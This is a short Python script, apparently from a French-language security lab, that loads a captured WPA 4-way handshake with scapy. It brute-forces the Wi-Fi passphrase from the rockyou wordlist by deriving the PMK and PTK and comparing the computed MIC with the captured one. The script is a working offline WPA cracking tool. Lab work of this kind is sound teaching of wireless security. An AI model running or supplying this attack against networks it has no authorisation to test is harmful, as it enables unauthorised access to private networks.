#!/usr/bin/env python

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = wpa[0].info.decode()
APmac       = a2b_hex(wpa[5].addr1.replace(':',''))
Clientmac   = a2b_hex(wpa[5].addr2.replace(':',''))

# Authenticator and Supplicant Nonces
ANonce      = wpa[5].load[13:45]
SNonce      = wpa[6].load[13:45]

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = wpa[8].load[77:93]

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée

#Lecture du fichier de mdp
mdpFile = open('rockyou-65.txt', 'r') 
lines = mdpFile.readlines()

ssid = str.encode(str(ssid))
print("Processing to brute force...")
for line in lines :
    passPhrase = str.encode(line[:-1])

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
    mic = mic.hexdigest()[0:32]

    if(mic == mic_to_test.hex()):
        print("The passphrase is " + line)
        break
